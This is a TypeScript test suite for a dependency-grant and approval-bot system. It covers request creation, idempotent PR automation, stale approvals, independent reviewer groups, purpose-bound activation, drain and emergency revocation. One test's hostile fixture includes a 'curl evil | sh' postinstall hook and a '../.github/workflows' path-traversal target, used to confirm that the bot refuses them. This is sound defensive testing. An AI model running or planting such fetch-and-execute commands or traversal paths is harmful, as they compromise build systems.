/**
 * M16 (PAR-132..139): cross-service `uses` edges become reviewed, activated,
 * purpose-bound privileges. Importing a contract creates a *request*, never
 * a grant; PR automation is idempotent and never executes caller code; a
 * changed head invalidates review; independent reviewer checks are enforced;
 * merge is not activation; grants are non-transitive and purpose-exact;
 * retirement respects drain and emergency revocation is not undone by rollback.
 */
import { readFileSync } from "node:fs";
import { resolve } from "node:path";
import { describe, expect, it } from "vitest";
import type { AppBundle, CallContext, ExternalBinding } from "@forgegraph/runtime";
import { generateSigner, type TrustPolicy } from "../src/artifacts.js";
import { ApprovalBot, MemoryRepoHost } from "../src/approval-bot.js";
import { publishGrant } from "../src/grant-publication.js";
import { GrantRegistry, compareRequests, guardExternals, requestFrom, signRequest, type DependencyGrant, type DependencyRequest } from "../src/grants.js";

const acme = JSON.parse(readFileSync(resolve(import.meta.dirname, "..", "..", "..", "conformance", "fixtures", "acme.app.json"), "utf8")) as AppBundle;

async function world() {
  const ci = await generateSigner("acme-ci");
  const release = await generateSigner("release");
  const trust: TrustPolicy = { authority: "registry.acme", signers: { "acme-ci": ci.publicKey, release: release.publicKey } };
  const repos = new MemoryRepoHost({ "acme/payments": { defaultBranch: "main", protected: true }, "acme/commerce": { defaultBranch: "main", protected: true } });
  const bot = new ApprovalBot({
    trust,
    repos,
    owners: { "@acme/payments": { repo: "acme/payments", grantsPath: "grants/", requiredGroups: ["payments-owners", "security"] } },
  });
  const request = requestFrom({ bundle: acme, callee: "@acme/payments", lock: { name: "@acme/payments", version: "0.1.0", hash: "sha256:" + "1".repeat(64) }, caller: { identity: "acme-prod/commerce", repo: "acme/commerce", environment: "prod", audience: "org:acme", scope: "orders" }, purposes: { "@acme/payments/_/AuthorizePayment": "@acme/payments/_/Charge" }, assurance: "workload-bound", lifetime: { expiresAt: "2027-01-01T00:00:00Z" }, provenance: { ci: "run-1", commit: "c1", head: "h1" } });
  return { ci, release, trust, repos, bot, request };
}

describe("PAR-132/133: uses creates a request, PR automation is idempotent", () => {
  it("importing a contract yields a request with edge digests and no runtime access; identical requests update one PR", async () => {
    const { ci, bot, repos, request } = await world();
    expect(request.version).toBe("dependency-request/1");
    expect(request.edges).toEqual([{ kind: "function", callee: "@acme/payments/_/AuthorizePayment", caller: "@acme/commerce/_/SubmitOrder", purpose: "@acme/payments/_/Charge" }]);
    expect(request.caller.digests["security"]).toBe(acme.digests!["security"]);
    // no grant, no access
    const grants = new GrantRegistry({ trust: (await world()).trust });
    expect(grants.verify({ caller: "acme-prod/commerce", callee: "@acme/payments/_/AuthorizePayment", purpose: "@acme/payments/_/Charge", epoch: 1 })).toMatchObject({ allowed: false, reason: expect.stringMatching(/no activated grant/) });
    // automation: same signed artifact processed three times -> one PR, updated in place
    const signed = await signRequest(request, ci);
    const first = await bot.process(signed);
    const second = await bot.process(signed);
    const third = await bot.process(signed);
    expect(first.pr).toBe(second.pr);
    expect(second.pr).toBe(third.pr);
    expect(repos.prs("acme/payments")).toHaveLength(1);
    const pr = repos.prs("acme/payments")[0]!;
    expect(pr.state).toBe("open");
    expect(Object.keys(pr.files)).toEqual([`grants/@acme/commerce/${request.digest}.json`]);
    expect(pr.links).toEqual({ callerRepo: "acme/commerce", callerCommit: "c1", callerHead: "h1" });
    // still denied while the PR is open
    expect(grants.verify({ caller: "acme-prod/commerce", callee: "@acme/payments/_/AuthorizePayment", purpose: "@acme/payments/_/Charge", epoch: 1 }).allowed).toBe(false);
  });
});

describe("PAR-134: a changed head invalidates approval", () => {
  it("a request whose caller content changed after approval cannot be published with the stale evidence", async () => {
    const { ci, release, bot, repos, request, trust } = await world();
    const pr1 = await bot.process(await signRequest(request, ci));
    repos.approve("acme/payments", pr1.pr, { group: "payments-owners", reviewer: "pay-lead", head: pr1.head });
    repos.approve("acme/payments", pr1.pr, { group: "security", reviewer: "sec-lead", head: pr1.head });
    // the caller adds sensitive data: a new security digest and head
    const changed: DependencyRequest = { ...request, caller: { ...request.caller, digests: { ...request.caller.digests, security: "f".repeat(64) } }, provenance: { ...request.provenance, commit: "c2", head: "h2" } };
    const pr2 = await bot.process(await signRequest({ ...changed, digest: "" }, ci));
    expect(pr2.pr).toBe(pr1.pr); // same request key: updated, not duplicated
    expect(pr2.head).not.toBe(pr1.head);
    expect(repos.prs("acme/payments")[0]!.approvals.every((a) => a.stale)).toBe(true);
    repos.merge("acme/payments", pr2.pr, { into: "main", mergeCommit: "m1" });
    // publishing with the old approvals (their head is pr1.head) fails on head mismatch
    await expect(publishGrant({ repos, repo: "acme/payments", pr: pr2.pr, requiredGroups: ["payments-owners", "security"], signer: release, trust })).rejects.toThrow(/head .* differs from the reviewed head|stale/);
    // semver-compatible but security-widening changes require reapproval by construction
    expect(compareRequests(request, changed)).toEqual({ compatible: false, reasons: ["security digest changed"] });
    const widened: DependencyRequest = { ...request, edges: [...request.edges, { kind: "function", callee: "@acme/payments/_/Refund", caller: "@acme/commerce/_/SubmitOrder", purpose: "@acme/payments/_/Charge" }] };
    expect(compareRequests(request, widened).reasons).toContain("edge added: @acme/payments/_/Refund");
    const repurposed: DependencyRequest = { ...request, edges: [{ ...request.edges[0]!, purpose: "@acme/payments/_/Marketing" }] };
    expect(compareRequests(request, repurposed).reasons).toContain("purpose changed on @acme/payments/_/AuthorizePayment");
  });
});

describe("PAR-135: multiple reviewer groups are independent checks", () => {
  it("one CODEOWNER listed under both groups does not satisfy both; each group needs its own approval", async () => {
    const { ci, release, bot, repos, request, trust } = await world();
    const pr = await bot.process(await signRequest(request, ci));
    // one person approves; CODEOWNERS lists them under both paths
    repos.approve("acme/payments", pr.pr, { group: "payments-owners", reviewer: "dual-hat", head: pr.head });
    repos.merge("acme/payments", pr.pr, { into: "main", mergeCommit: "m1" });
    await expect(publishGrant({ repos, repo: "acme/payments", pr: pr.pr, requiredGroups: ["payments-owners", "security"], signer: release, trust })).rejects.toThrow(/security/);
    // the same reviewer cannot count for the second group either
    repos.approve("acme/payments", pr.pr, { group: "security", reviewer: "dual-hat", head: pr.head });
    await expect(publishGrant({ repos, repo: "acme/payments", pr: pr.pr, requiredGroups: ["payments-owners", "security"], signer: release, trust })).rejects.toThrow(/independent/);
    repos.approve("acme/payments", pr.pr, { group: "security", reviewer: "sec-lead", head: pr.head });
    const grant = await publishGrant({ repos, repo: "acme/payments", pr: pr.pr, requiredGroups: ["payments-owners", "security"], signer: release, trust });
    expect(grant.version).toBe("dependency-grant/1");
    expect(grant.approvals.map((a) => a.group).sort()).toEqual(["payments-owners", "security"]);
    expect(grant.request).toBe(request.digest);
    expect(grant.mergeCommit).toBe("m1");
    // an unmerged or non-protected-branch merge never publishes
    const pr2 = await bot.process(await signRequest({ ...request, provenance: { ...request.provenance, head: "h9" }, digest: "" }, ci));
    await expect(publishGrant({ repos, repo: "acme/payments", pr: pr2.pr, requiredGroups: ["payments-owners"], signer: release, trust })).rejects.toThrow(/not merged/);
  });
});

describe("PAR-136: privileged bot isolation", () => {
  it("the bot never executes caller content and cannot write outside the callee's grants path or to other repositories", async () => {
    const { ci, bot, repos, request } = await world();
    // a hostile request carries executable-looking content and tries to steer the write target
    const hostile = { ...request, callee: { ...request.callee, package: "@acme/payments" }, provenance: { ...request.provenance, head: "h-evil" }, hooks: { postinstall: "curl evil | sh" }, target: { repo: "acme/commerce", path: "../.github/workflows/deploy.yml" } } as DependencyRequest & { hooks: unknown; target: unknown };
    const out = await bot.process(await signRequest({ ...hostile, digest: "" }, ci));
    const pr = repos.prs("acme/payments").find((p) => p.number === out.pr)!;
    expect(Object.keys(pr.files)).toEqual([`grants/@acme/commerce/${out.request}.json`]);
    expect(repos.prs("acme/commerce")).toEqual([]);
    expect(bot.executed).toEqual([]); // there is no execution path at all
    // an artifact for a callee without a registered owner, or signed by an unknown key, is refused
    await expect(bot.process(await signRequest({ ...request, callee: { package: "@evil/x", version: "1.0.0" }, digest: "" }, ci))).rejects.toThrow(/no registered owner/);
    const rogue = await generateSigner("rogue");
    await expect(bot.process(await signRequest(request, rogue))).rejects.toThrow(/not trusted/);
    // even an owner mapping that points outside the grants path is refused at configuration time
    expect(() => new ApprovalBot({ trust: (bot as unknown as { o: { trust: TrustPolicy } }).o.trust, repos, owners: { "@x/y": { repo: "x/y", grantsPath: "../", requiredGroups: [] } } })).toThrow(/grantsPath/);
  });
});

describe("PAR-137/138: activation, admission, non-transitive purpose-bound edges", () => {
  async function published() {
    const w = await world();
    const pr = await w.bot.process(await signRequest(w.request, w.ci));
    w.repos.approve("acme/payments", pr.pr, { group: "payments-owners", reviewer: "pay-lead", head: pr.head });
    w.repos.approve("acme/payments", pr.pr, { group: "security", reviewer: "sec-lead", head: pr.head });
    w.repos.merge("acme/payments", pr.pr, { into: "main", mergeCommit: "m1" });
    const grant = await publishGrant({ repos: w.repos, repo: "acme/payments", pr: pr.pr, requiredGroups: ["payments-owners", "security"], signer: w.release, trust: w.trust });
    return { ...w, grant };
  }

  it("PAR-138: a merged PR and even a published grant remain denied until activation for the deployed identity", async () => {
    const { grant, trust } = await published();
    const grants = new GrantRegistry({ trust });
    const edge = { caller: "acme-prod/commerce", callee: "@acme/payments/_/AuthorizePayment", purpose: "@acme/payments/_/Charge", epoch: 1 };
    expect(grants.verify(edge).allowed).toBe(false);
    await grants.admit(grant); // published and verified, but not yet bound to a deployment
    expect(grants.verify(edge)).toMatchObject({ allowed: false, reason: expect.stringMatching(/not activated/) });
    expect(grants.graphs().approved).toEqual([{ caller: "acme-prod/commerce", callee: "@acme/payments/_/AuthorizePayment", purpose: "@acme/payments/_/Charge" }]);
    expect(grants.graphs().activated).toEqual([]);
    await grants.activate(grant.digest, { identity: "acme-prod/commerce", epoch: 1, snapshotAck: true });
    expect(grants.verify(edge).allowed).toBe(true);
    // activation for another identity does not carry over
    expect(grants.verify({ ...edge, caller: "acme-staging/commerce" }).allowed).toBe(false);
    // a tampered grant is never admitted
    await expect(grants.admit({ ...grant, approvals: [] })).rejects.toThrow(/signature/);
    // the runtime edge: externals are wrapped so a call without an activated grant fails before the adapter runs
    let calls = 0;
    const binding: ExternalBinding = async () => { calls++; return { ok: true, value: {} }; };
    const guarded = guardExternals({ "@acme/payments/_/AuthorizePayment": binding }, grants, { identity: "acme-prod/commerce", epoch: () => 1 });
    const ctx: CallContext = { tenant: "t", actor: "a", requestId: "r", purpose: "@acme/payments/_/Charge" };
    expect((await guarded["@acme/payments/_/AuthorizePayment"]!({}, ctx)).ok).toBe(true);
    expect((await guarded["@acme/payments/_/AuthorizePayment"]!({}, { ...ctx, purpose: "@acme/payments/_/Marketing" })).ok).toBe(false);
    expect(calls).toBe(1);
    expect(grants.graphs().observed).toEqual([{ caller: "acme-prod/commerce", callee: "@acme/payments/_/AuthorizePayment", purpose: "@acme/payments/_/Charge" }]);
  });

  it("PAR-137: A→B and B→C never authorize A→C, and a purpose change on A→B is denied", async () => {
    const { grant, trust, release } = await published();
    const grants = new GrantRegistry({ trust });
    await grants.admit(grant);
    await grants.activate(grant.digest, { identity: "acme-prod/commerce", epoch: 1, snapshotAck: true });
    // B→C: payments may call the ledger under a different purpose
    const bc: DependencyGrant = await grants.testGrant({ caller: "acme-prod/payments", callee: "@acme/ledger/_/Post", purpose: "@acme/ledger/_/Settlement" }, release);
    await grants.admit(bc);
    await grants.activate(bc.digest, { identity: "acme-prod/payments", epoch: 1, snapshotAck: true });
    expect(grants.verify({ caller: "acme-prod/payments", callee: "@acme/ledger/_/Post", purpose: "@acme/ledger/_/Settlement", epoch: 1 }).allowed).toBe(true);
    expect(grants.verify({ caller: "acme-prod/commerce", callee: "@acme/ledger/_/Post", purpose: "@acme/ledger/_/Settlement", epoch: 1 })).toMatchObject({ allowed: false, reason: expect.stringMatching(/no activated grant/) });
    expect(grants.verify({ caller: "acme-prod/commerce", callee: "@acme/payments/_/AuthorizePayment", purpose: "@acme/ledger/_/Settlement", epoch: 1 })).toMatchObject({ allowed: false, reason: expect.stringMatching(/purpose/) });
    expect(grants.verify({ caller: "acme-prod/commerce", callee: "@acme/payments/_/AuthorizePayment", purpose: "@acme/payments/_/Charge", epoch: 1 }).allowed).toBe(true);
  });
});

describe("PAR-139: drain and emergency revocation", () => {
  it("planned retirement honours the declared drain; emergency revoke applies within its bound and survives rollback", async () => {
    const w = await world();
    const pr = await w.bot.process(await signRequest(w.request, w.ci));
    w.repos.approve("acme/payments", pr.pr, { group: "payments-owners", reviewer: "pay-lead", head: pr.head });
    w.repos.approve("acme/payments", pr.pr, { group: "security", reviewer: "sec-lead", head: pr.head });
    w.repos.merge("acme/payments", pr.pr, { into: "main", mergeCommit: "m1" });
    const grant = await publishGrant({ repos: w.repos, repo: "acme/payments", pr: pr.pr, requiredGroups: ["payments-owners", "security"], signer: w.release, trust: w.trust });
    const grants = new GrantRegistry({ trust: w.trust });
    await grants.admit(grant);
    await grants.activate(grant.digest, { identity: "acme-prod/commerce", epoch: 1, snapshotAck: true });
    const edge = { caller: "acme-prod/commerce", callee: "@acme/payments/_/AuthorizePayment", purpose: "@acme/payments/_/Charge" };
    // the new source drops the dependency; an old release's workflow instances still use it
    grants.observeUse(grant.digest, { release: "commerce@0.1.0", workflow: "ProcessOrder", instances: 3 });
    const retirement = grants.retire(grant.digest, { drainUntil: "2026-10-01T00:00:00Z", requestedAt: "2026-09-20T00:00:00Z" });
    expect(retirement).toMatchObject({ state: "draining", inUseBy: [{ release: "commerce@0.1.0", workflow: "ProcessOrder", instances: 3 }] });
    expect(grants.verify({ ...edge, epoch: 1, now: Date.parse("2026-09-25T00:00:00Z") }).allowed).toBe(true); // within drain
    expect(grants.verify({ ...edge, epoch: 1, now: Date.parse("2026-10-02T00:00:00Z") })).toMatchObject({ allowed: false, reason: expect.stringMatching(/drain/) });
    // removing the dependency from source does not by itself break the draining release: that needs a policy decision
    expect(grants.retire(grant.digest, { drainUntil: "2026-09-21T00:00:00Z", requestedAt: "2026-09-20T00:00:00Z" })).toMatchObject({ state: "draining", drainUntil: "2026-10-01T00:00:00Z", note: expect.stringMatching(/policy decision/) });
    // emergency revoke, in a separate run: immediate within its bound, epoch bumped, rollback does not undo it
    const revoked = grants.emergencyRevoke(grant.digest, { reason: "key compromise", at: "2026-09-22T00:00:00Z", boundMs: 60_000 });
    expect(revoked.epoch).toBeGreaterThan(1);
    expect(grants.verify({ ...edge, epoch: revoked.epoch, now: Date.parse("2026-09-22T00:00:30Z") })).toMatchObject({ allowed: false, reason: expect.stringMatching(/emergency/) });
    // a stale caller still on the old epoch is refused too (the bound is the cache lifetime, not a courtesy window)
    expect(grants.verify({ ...edge, epoch: 1, now: Date.parse("2026-09-22T00:00:30Z") }).allowed).toBe(false);
    await grants.activate(grant.digest, { identity: "acme-prod/commerce", epoch: revoked.epoch, snapshotAck: true }); // "rollback": re-activating the same grant
    expect(grants.verify({ ...edge, epoch: revoked.epoch, now: Date.parse("2026-09-23T00:00:00Z") })).toMatchObject({ allowed: false, reason: expect.stringMatching(/revoked/) });
    // unused-grant review is a suggestion backed by telemetry coverage, never an automatic removal
    const report = grants.reviewUnused({ now: Date.parse("2026-09-23T00:00:00Z"), sinceMs: 7 * 86_400_000, telemetryCoverage: 0.6 });
    expect(report).toMatchObject({ suggestions: expect.any(Array), telemetryCoverage: 0.6, automatic: false });
  });
});
